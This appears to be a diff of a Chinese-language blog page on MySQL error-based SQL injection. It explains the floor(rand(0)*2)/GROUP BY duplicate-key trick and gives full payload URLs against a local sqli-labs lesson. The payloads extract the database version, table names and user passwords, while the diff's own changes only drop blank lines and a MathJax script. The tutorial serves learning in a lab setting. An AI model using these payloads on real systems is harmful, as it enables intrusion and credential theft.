@@ -561,18 +561,15 @@
 <hr>
 <h2 id="这里介绍一下floor-rand-0-2"><a href="#这里介绍一下floor-rand-0-2" class="headerlink" title="这里介绍一下floor(rand(0)*2)"></a>这里介绍一下floor(rand(0)*2)</h2><p>查询的时使用rand()，该值会被执行多次。在使用group by时，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，在插入虚表的时候会再被执行一次。在一次多记录的查询过程中 floor(rand(0)*2)的值是固定的，为011011</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">group</span> <span class="token keyword">by</span> floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>当为第一个数字0时不进行插入虚表；<br>当为第二个数字1时插入虚表，插入后key值为1，count(*)为1；<br>当为第三个数字1时插入虚表，插入后key值为1，因为前面一个1已经插入虚表所以这个1不再在虚表中添加一行，但1对应的 count()加1；<br>当为第四个数字0时，因为虚表中没有对应的记录，所以会重新建立虚表，然后重复上面的操作。<br>所以看似操作了5次，但其实只要前三次就可以卡出来了。</p>
 <hr>
 <h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p>1.获取数据库</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli/Less-5//?id=0' union select 1,2,3 from(select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from </span>
 information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>2.获取表名</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli/Less-5//?id=0' union select 1,2,3 from(select count(*),concat((select </span>
 concat<span class="token punctuation">(</span>table_name<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span>
 <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p>3.获取用户信息</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli/Less-5//?id=0' union select 1,2,3 from(select count(*),concat((select </span>
 concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">)</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token keyword">limit</span> 
@@ -1542,20 +1539,5 @@ concat<span class="token punctuation">(</span>username<span class="token punctua
 
 
 
-  <script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-</body>
+  </body>
 </html>
